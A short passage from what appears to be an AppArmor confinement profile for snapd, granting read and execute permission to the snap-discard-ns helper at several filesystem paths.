   638	    /usr/lib{,exec,64}/snapd/snap-discard-ns rix,
   639	    /var/lib/snapd/hostfs/usr/lib{,exec,64}/snapd/snap-discard-ns rix,
   640	    /{,var/lib/snapd/}snap/{core,snapd}/*/usr/lib/snapd/snap-discard-ns rix,
